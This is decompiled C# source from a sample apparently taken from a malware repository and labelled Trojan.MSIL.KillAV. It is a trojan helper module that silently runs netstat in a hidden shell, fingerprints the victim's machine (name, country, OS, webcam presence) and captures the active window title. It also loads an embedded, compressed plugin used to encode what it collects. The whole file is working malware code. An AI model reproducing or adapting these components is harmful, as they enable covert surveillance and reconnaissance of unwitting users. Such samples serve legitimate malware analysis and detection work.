// Decompiled with JetBrains decompiler
// Type: n.API
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.KillAV.ao-c83dfee0b35be414b2ecb0a3b5fff41c790bb356c2774a2fc681a8981978b48b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.MyServices;
using n.My;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;

namespace n
{
  [StandardModule]
  internal sealed class API
  {
    private const uint LOCALE_SYSTEM_DEFAULT = 1024;
    private const uint LOCALE_SABBREVCTRYNAME = 7;

    public static string fx(ref Array A)
    {
      string str1;
      try
      {
        foreach (object obj in A)
        {
          string str2 = Conversions.ToString(obj);
          bool flag;
          if (Strings.InStr(str2, "Local Address") > 0)
            flag = true;
          else if (flag)
          {
            string str3;
            if (Operators.CompareString(str2, "", false) == 0)
            {
              str1 = Strings.Mid(str3, 1, checked (str3.Length - 1));
              break;
            }
            do
            {
              str2 = Strings.Replace(str2, "  ", " ");
            }
            while (Strings.InStr(str2, "  ") > 0);
            string[] strArray = Strings.Split(str2);
            string str4;
            try
            {
              str4 = Strings.Split(Process.GetProcessById(Conversions.ToInteger(strArray[5])).MainModule.FileName, "\\")[checked (Strings.Split(Process.GetProcessById(Conversions.ToInteger(strArray[5])).MainModule.FileName, "\\").Length - 1)] + ":" + strArray[5];
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              str4 = Process.GetProcessById(Conversions.ToInteger(strArray[5])).ProcessName + ":" + strArray[5];
              ProjectData.ClearProjectError();
            }
            str3 = str3 + str4 + "," + strArray[1] + "," + strArray[2] + "," + strArray[3].ToLower().Replace(MyProject.Computer.Name.ToLower(), "127.0.0.1") + "," + strArray[4] + "!";
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return str1;
    }

    public static string Gt()
    {
      Process process = Process.Start(new ProcessStartInfo()
      {
        UseShellExecute = false,
        RedirectStandardError = true,
        RedirectStandardInput = true,
        RedirectStandardOutput = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd"
      });
      process.StandardInput.WriteLine("netstat -o");
      process.StandardInput.WriteLine("exit");
      StreamReader streamReader = new StreamReader(process.StandardOutput.BaseStream);
      Array A = (Array) Strings.Split(process.StandardOutput.ReadToEnd(), "\r\n");
      return API.fx(ref A);
    }

    public static byte[] ZIP(byte[] B, ref bool CM)
    {
      if (CM)
      {
        MemoryStream memoryStream = new MemoryStream();
        GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true);
        gzipStream.Write(B, 0, B.Length);
        gzipStream.Dispose();
        memoryStream.Position = 0L;
        byte[] buffer = new byte[checked ((int) memoryStream.Length + 1)];
        memoryStream.Read(buffer, 0, buffer.Length);
        memoryStream.Dispose();
        return buffer;
      }
      MemoryStream memoryStream1 = new MemoryStream(B);
      GZipStream gzipStream1 = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress);
      byte[] buffer1 = new byte[4];
      memoryStream1.Position = checked (memoryStream1.Length - 5L);
      memoryStream1.Read(buffer1, 0, 4);
      int int32 = BitConverter.ToInt32(buffer1, 0);
      memoryStream1.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1)];
      gzipStream1.Read(array, 0, int32);
      gzipStream1.Dispose();
      memoryStream1.Dispose();
      return array;
    }

    public static string FEN(byte[] B)
    {
      ref byte[] local1 = ref C.Plug;
      string str1 = "plugin.C";
      ref string local2 = ref str1;
      string str2 = nameof (FEN);
      ref string local3 = ref str2;
      object obj = (object) new object[1]{ (object) B };
      ref object local4 = ref obj;
      return C.inv(ref local1, ref local2, ref local3, ref local4).ToString();
    }

    public static byte[] FDE(string B)
    {
      ref byte[] local1 = ref C.Plug;
      string str1 = "plugin.C";
      ref string local2 = ref str1;
      string str2 = nameof (FDE);
      ref string local3 = ref str2;
      object obj = (object) new object[1]{ (object) B };
      ref object local4 = ref obj;
      return (byte[]) NewLateBinding.LateGet(C.inv(ref local1, ref local2, ref local3, ref local4), (Type) null, "clone", new object[0], (string[]) null, (Type[]) null, (bool[]) null);
    }

    public static string ENB(ref string s)
    {
      ref byte[] local1 = ref C.Plug;
      string str1 = "plugin.C";
      ref string local2 = ref str1;
      string str2 = nameof (ENB);
      ref string local3 = ref str2;
      object obj = (object) new object[1]{ (object) s };
      ref object local4 = ref obj;
      return C.inv(ref local1, ref local2, ref local3, ref local4).ToString();
    }

    public static string DEB(ref string s)
    {
      object[] objArray = new object[1]{ (object) s };
      if (C.Plug == null)
      {
        try
        {
          byte[] plugin = n.My.Resources.Resources.plugin;
          bool flag = false;
          ref bool local = ref flag;
          C.Plug = API.ZIP(plugin, ref local);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      string str1;
      try
      {
        ref byte[] local1 = ref C.Plug;
        string str2 = "plugin.C";
        ref string local2 = ref str2;
        string str3 = nameof (DEB);
        ref string local3 = ref str3;
        object obj = (object) objArray;
        ref object local4 = ref obj;
        str1 = C.inv(ref local1, ref local2, ref local3, ref local4).ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [DllImport("kernel32.dll")]
    private static extern int GetLocaleInfo(
      uint Locale,
      uint LCType,
      [Out] StringBuilder lpLCData,
      int cchData);

    private static string Gcc(uint lInfo)
    {
      StringBuilder lpLCData = new StringBuilder(256);
      int localeInfo = API.GetLocaleInfo(1024U, lInfo, lpLCData, lpLCData.Capacity);
      return localeInfo > 0 ? lpLCData.ToString().Substring(0, checked (localeInfo - 1)) : string.Empty;
    }

    public static string Gc() => API.Gcc(7U);

    public static string A0()
    {
      RegistryProxy registry = MyProject.Computer.Registry;
      string str1 = B.PC + "\r\n";
      string str2;
      try
      {
        str2 = str1 + API.Gc() + "\r\n";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = str1 + "X\r\n";
        ProjectData.ClearProjectError();
      }
      string str3;
      try
      {
        str3 = str2 + MyProject.Computer.Info.OSFullName + "\r\n";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str3 = str2 + "X\r\n";
        ProjectData.ClearProjectError();
      }
      string Expression = (B.CAM ? str3 + "Yes\r\n" : str3 + "No\r\n") + B.ver;
      string str4;
      try
      {
        str4 = Strings.Replace(Strings.Replace(Strings.Replace(Expression, "Microsoft", ""), "Windows", "Win").Replace("®", "").Replace("™", ""), "  ", " ");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str4 = Expression + "X\r\n";
        ProjectData.ClearProjectError();
      }
      return str4 + "\r\n \r\n ";
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowTextLength(long hwnd);

    public static string A1(ref bool p)
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = API.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
        {
          str1 = "";
        }
        else
        {
          int windowTextLength = API.GetWindowTextLength((long) foregroundWindow);
          string str2 = Strings.StrDup(checked (windowTextLength + 1), "*");
          API.GetWindowText(foregroundWindow, ref str2, checked (windowTextLength + 1));
          int lpdwProcessID;
          API.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
          if (lpdwProcessID == 0)
          {
            str1 = API.ENB(ref str2);
          }
          else
          {
            try
            {
              string mainWindowTitle = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
              str1 = API.ENB(ref mainWindowTitle);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              str1 = API.ENB(ref str2);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public class wd
    {
      public const int HIDE = 0;
      public const int Normal = 1;
      public const int Minimized = 2;
      public const int Maximized = 3;
      public const int Show = 5;
      public const int RESTORE = 9;
      public int hWnd;

      public static void G(ref int hwd, ref int A) => API.wd.ShowWindow(hwd, A);

      [DllImport("user32")]
      public static extern int ShowWindow(int hwnd, int nCmdShow);
    }
  }
}
